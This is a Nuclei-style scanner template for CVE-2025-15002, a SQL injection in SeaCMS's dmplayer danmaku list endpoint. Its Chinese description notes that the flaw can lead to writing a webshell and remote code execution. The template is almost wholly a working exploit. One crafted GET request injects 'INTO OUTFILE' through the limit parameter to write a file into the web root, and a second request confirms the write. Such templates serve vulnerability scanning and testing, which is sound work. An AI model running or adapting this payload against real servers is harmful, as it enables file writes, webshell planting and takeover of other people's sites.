id: seacms-dmplayer-sqli

info:
  name: "SeaCMS dmplayer组件mysqli.class.php显示_弹幕列表函数SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    SeaCMS 13.3及之前版本的js/player/dmplayer/dmku/class/mysqli.class.php组件中，
      显示_弹幕列表()函数对page和limit参数未实施类型验证，导致可被利用的SQL注入缺陷。
      攻击者通过构造恶意请求可实现数据库敏感信息检索，
      当MySQL配置secure_file_priv参数为空时，
      可进一步通过SQL注入写入Webshell实现远程代码执行。
  reference:
  - CVE-2025-15002
  tags: SeaCMS

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    GET /js/player/dmplayer/dmku/index.php?ac=list&id=1&page=1&limit=1%20INTO%20OUTFILE%20'/var/www/html/NTest.txt'%20LINES%20TERMINATED%20BY%200x4E64617954657374 HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json
- raw:
  - |
    GET /NTest.txt HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
